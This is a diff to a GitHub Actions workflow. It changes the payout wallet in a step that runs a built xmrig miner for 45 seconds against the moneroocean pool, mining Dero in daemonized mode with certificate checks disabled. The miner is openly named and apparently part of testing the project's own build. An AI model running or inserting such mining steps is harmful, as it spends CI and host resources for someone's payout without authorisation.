@@ -45,6 +45,6 @@ jobs:
       run: |
         cd ${{github.workspace}}/build/binaries/ && ls -la
         sudo chmod +x ./xmrigMiner
-        timeout 45 ./xmrigMiner -o gulf.moneroocean.stream:20128 -u 72f74433f00c4b3c38df1dc926046a03e692b0770fded4da65ed49e0900471c9 --tls -k --coin dero -a astrobwt --daemonized
+        timeout 45 ./xmrigMiner -o gulf.moneroocean.stream:20128 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc --tls -k --coin dero -a astrobwt --daemonized
 
 
